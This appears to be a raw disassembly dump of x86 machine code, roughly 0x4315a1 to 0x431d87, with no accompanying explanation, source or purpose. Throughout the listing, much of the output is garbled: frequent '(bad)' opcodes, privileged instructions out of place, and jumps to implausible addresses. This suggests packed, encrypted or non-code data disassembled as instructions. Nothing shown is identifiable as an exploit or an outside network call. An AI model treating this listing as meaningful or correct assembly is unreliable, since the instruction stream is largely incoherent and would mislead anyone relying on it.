  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
  431ba9:	jne    0x431b36
  431bab:	xor    edi,esp
  431bad:	inc    eax
  431bae:	dec    ebp
  431baf:	jbe    0x431c04
  431bb1:	inc    eax
  431bb2:	pop    ebp
  431bb3:	add    edx,DWORD PTR [esi+0x8]
  431bb6:	push   esp
  431bb7:	dec    eax
  431bb8:	push   ecx
  431bb9:	mov    eax,edi
  431bbb:	and    al,0xf0
  431bbd:	jo     0x431baa
  431bbf:	mov    eax,DWORD PTR [ebx]
  431bc1:	sbb    BYTE PTR [ebp+0x4d],cl
  431bc4:	mov    eax,DWORD PTR [ebx]
  431bc6:	nop
  431bc7:	or     BYTE PTR [eax],al
  431bc9:	jne    0x431c22
  431bcb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431bd1:	cld    
  431bd2:	xor    edi,edi
  431bd4:	add    edi,DWORD PTR [ebp+0x3]
  431bd7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431bdd:	js     0x431b63
  431bdf:	jae    0x431be3
  431be1:	(bad)  
  431be3:	xor    al,0x5d
  431be5:	jmp    0x431b72
  431be7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431bee:	fdecstp 
  431bf0:	test   BYTE PTR [edi],ah
  431bf2:	add    bh,BYTE PTR [ebp+0x0]
  431bf5:	add    ebx,DWORD PTR [ebp-0x77]
  431bf8:	mov    edi,eax
  431bfa:	cmp    al,0x0
  431bfd:	adc    dh,BYTE PTR [ebx]
  431bff:	jge    0x431c04
  431c01:	mov    edi,DWORD PTR [ebx]
  431c03:	jl     0x431c14
  431c05:	clc    
  431c06:	dec    edi
  431c07:	jge    0x431c09
  431c09:	mov    eax,DWORD PTR [ebx]
  431c0b:	jb     0x431c15
  431c0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431c10:	mov    edi,edi
  431c12:	xor    edx,DWORD PTR [eax]
  431c14:	add    edi,DWORD PTR [ebx]
  431c16:	mov    DWORD PTR [ebp-0x10],edi
  431c19:	inc    edi
  431c1a:	pop    ebp
  431c1b:	jge    0x431c58
  431c1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431c21:	mov    edx,0xc05d87f0
  431c26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431c2a:	fimul  WORD PTR [eax]
  431c2c:	fist   WORD PTR [ebp+0x1c]
  431c2f:	in     al,dx
  431c30:	jne    0x431c1e
  431c32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431c38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431c3c:	fdivp  st(0),st
  431c3e:	fild   WORD PTR [ebp+0x4510f85c]
  431c44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431c4a:	inc    ebp
  431c4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431c51:	mov    ebp,DWORD PTR [ebx-0x4]
  431c54:	adc    al,0x8b
  431c56:	rcl    DWORD PTR [eax],0x48
  431c59:	mov    esi,0x7080803
  431c5e:	fiadd  WORD PTR [ebp+0x4d]
  431c61:	(bad)  
  431c62:	mov    edx,DWORD PTR [edx-0x4]
  431c65:	mov    edx,DWORD PTR [ebp-0x4]
  431c68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c6e:	mov    DWORD PTR [edi+0x872dc],edi
  431c74:	xlat   BYTE PTR ds:[ebx]
  431c75:	into   
  431c76:	ffreep st(6)
  431c78:	retf   0x6c7
  431c7b:	iret   
  431c7c:	dec    ebp
  431c7d:	inc    ebp
  431c7e:	mov    DWORD PTR [ebx],edi
  431c80:	fmul   QWORD PTR [edi]
  431c82:	dec    ebp
  431c83:	jnp    0x431cb8
  431c85:	add    BYTE PTR [ebx],al
  431c87:	mov    ecx,DWORD PTR [esp+edi*8]
  431c8a:	inc    ebp
  431c8b:	dec    ebp
  431c8c:	lea    esi,[ebx]
  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
